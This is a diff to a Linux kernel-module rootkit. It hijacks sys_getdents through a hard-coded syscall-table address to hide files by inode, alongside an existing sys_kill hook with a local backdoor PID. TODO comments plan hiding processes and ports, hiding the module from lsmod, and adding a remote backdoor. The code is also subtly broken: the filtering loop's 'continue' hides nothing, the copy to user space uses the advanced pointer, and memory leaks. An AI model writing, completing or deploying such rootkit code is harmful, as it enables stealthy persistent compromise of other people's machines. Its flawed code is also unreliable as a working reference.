@@ -9,11 +9,11 @@
 #include <linux/list.h>
 
 // TODO 
-// Hide files
-// Hide processess
+// Hide files and processes
 // Hide ports and add remote backdoor
 // Hide self from lsmod and other commands
 // Find the sys_call_table programmatically
+// Cite sources and document
 
 // for local backdoor
 #define LOCAL_PID 12345
@@ -28,6 +28,7 @@
 
 unsigned long *sys_call_table = (unsigned long*)0xc15b0000;  // hard coded, grep /boot/System.map
 
+// for hijacking sys_kill
 typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig); // for casting to avoid warnings
 kill_ptr orig_kill;
 
@@ -70,10 +71,68 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
 	return actual_result;
 }
 
+// for hijacking sys_getdents
+struct linux_dirent {
+	unsigned long d_ino;
+	unsigned long d_off;
+	unsigned short d_reclen;
+	char d_name[256];
+	char pad;
+	char d_type;
+};
+
+typedef asmlinkage int (*getdents_ptr)(unsigned int fd, struct linux_dirent *dirp,
+                                       unsigned int count);
+getdents_ptr orig_getdents;
+
+
+asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
+                               unsigned int count)
+{
+	int actual_result, i;
+	struct hidden_file *ptr;
+	struct linux_dirent toWorkWith;
+	struct linux_dirent *forUser;
+
+	// check user space access and allocate kernel space linux_dirent
+	if (!access_ok(VERIFY_READ,dirp,count))
+		return -1;
+	if ((forUser = kmalloc(count,GFP_KERNEL)) == NULL)
+		return -1;
+
+	// run real getdent and check result for files to hide
+	actual_result = (*orig_getdents)(fd,dirp,count);
+	if (actual_result > 0) { // actually read some bytes
+		for (i = 0; i < actual_result / sizeof(struct linux_dirent); i++) {
+			if (copy_from_user(&toWorkWith,dirp + i,sizeof(struct linux_dirent))) // (dirp + i)->d_reclen))
+				return -1;
+			list_for_each_entry(ptr,&hidden_files,list) {
+				if (toWorkWith.d_ino == ptr->inode)
+					continue;
+			}
+			*forUser++ = toWorkWith;
+		}
+	}
+
+	// copy linux_dirent * to user space
+	if (!access_ok(VERIFY_WRITE,dirp,count))
+		return -1;
+	if (copy_to_user(dirp,forUser,count))
+		return -1;
+
+	// return actual result
+	return actual_result;
+}
+
 int rootkit_init(void) {
 	GPF_DISABLE;
+
 	orig_kill = (kill_ptr)sys_call_table[__NR_kill];
 	sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
+
+	orig_getdents = (getdents_ptr)sys_call_table[__NR_getdents];
+	sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
+
 	GPF_ENABLE;
 	printk(KERN_INFO "Loading rootkit\n");
     	return 0;
@@ -81,12 +140,13 @@ int rootkit_init(void) {
 
 void rootkit_exit(void) {
 	struct hidden_file *ptr, *next;
-	list_for_each_entry(ptr,&hidden_files,list) {
-		printk(KERN_INFO "Inode: %d\n",ptr->inode);
-	}
+	//list_for_each_entry(ptr,&hidden_files,list) {
+	//	printk(KERN_INFO "Inode: %d\n",ptr->inode);
+	//}
 
 	GPF_DISABLE;
 	sys_call_table[__NR_kill] = (unsigned long)orig_kill;
+	sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
 	GPF_ENABLE;
 
 	list_for_each_entry_safe(ptr,next,&hidden_files,list) {
